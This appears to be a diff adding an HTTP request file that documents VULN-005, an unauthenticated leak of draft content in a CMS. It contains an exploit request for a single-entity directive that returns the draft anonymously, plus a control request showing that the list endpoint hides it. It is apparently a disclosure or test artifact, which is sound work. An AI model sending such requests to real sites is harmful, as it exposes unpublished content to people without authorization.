@@ -1,0 +1,14 @@
+### VULN-005 — unauth leak of non-public content via single-entity directive
+### (precondition seeded via admin: a DRAFT content item, status=0)
+
+### (A) EXPLOIT — anonymous single-entity read (no cookie); Host selects tenant
+GET /api/directive/cms/content?id=<draft-id> HTTP/1.1
+Host: site2.dev.publiccms.com
+
+### -> 200 {"object":{"title":"DRAFT_SECRET_<suffix>","status":0, ... }}   (LEAKED draft)
+
+### (B) CONTROL — the list directive (same anonymous caller) hides it
+GET /api/directive/cms/contentList?pageSize=200 HTTP/1.1
+Host: site2.dev.publiccms.com
+
+### -> 200 {"page":{"totalCount":1,"list":[{"id":1,...}]}}   (draft id absent)
